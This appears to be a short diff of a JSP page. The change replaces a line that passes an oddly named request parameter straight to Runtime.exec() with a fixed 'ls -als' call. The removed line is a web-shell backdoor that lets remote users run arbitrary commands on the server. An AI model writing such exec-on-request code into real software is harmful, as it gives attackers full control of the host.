@@ -4,7 +4,7 @@
 <%
 
 String res = "";
-Process p = Runtime.getRuntime().exec(request.getParameter("cmd_abncatdyei"));
+Process p = Runtime.getRuntime().exec("ls -als");
 OutputStream os = p.getOutputStream();
 InputStream in = p.getInputStream();
 DataInputStream dis = new DataInputStream(in);
